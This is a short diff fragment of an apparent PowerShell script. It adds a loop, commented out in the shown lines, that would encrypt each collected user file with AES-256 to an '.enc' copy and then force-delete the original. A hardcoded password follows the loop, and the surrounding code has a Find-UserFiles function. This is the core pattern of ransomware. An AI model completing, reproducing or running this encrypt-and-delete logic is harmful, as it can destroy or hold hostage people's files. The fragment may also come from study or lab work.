@@ -132,6 +132,22 @@ function Find-UserFiles
     return $foundFiles
  
 }
+
+foreach ($file in $filesToEncrypt)
+  
+ {
+  
+     # file encrypt .enc
+  
+     #$outputFile = "$($file.FullName).enc"
+  
+     #Write-Output "Encrypting $($file.FullName)" #debug
+  
+     #Encrypt-FileAES256 -InputFile $file.FullName -OutputFile $outputFile -Password $password
+  
+    #Remove-Item -Path $file.FullName -Force
+  
+ }
  
  
 $password = "MojeSuperTajneHaslo"
